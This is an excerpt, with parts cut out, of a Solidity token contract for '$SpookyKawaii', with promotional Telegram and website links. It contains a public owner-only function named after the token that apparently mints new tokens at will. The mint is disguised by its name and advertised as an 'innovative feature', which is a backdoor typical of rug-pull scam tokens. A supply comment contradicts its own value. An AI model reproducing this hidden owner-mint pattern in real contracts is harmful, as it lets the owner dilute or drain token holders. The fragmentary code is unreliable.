//
// $SpookyKawaii proposes an innovative feature in its contract.
//
// 📱 Telegram::https://t.me/SpookyKawaii
// 📱 Website ::https://SpookyKawaii.com
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _SpookyKawaii(uint256 amount) public onlyOwner {
 _SpookyKawaii(msg.sender, amount);
    }
    ...
    function _SpookyKawaii(address account, uint256 amount) internal virtual {
...
contract $SpookyKawaii is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("SPOOKY KAWAII", "S-KAWAII") {
     _SpookyKawaii(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}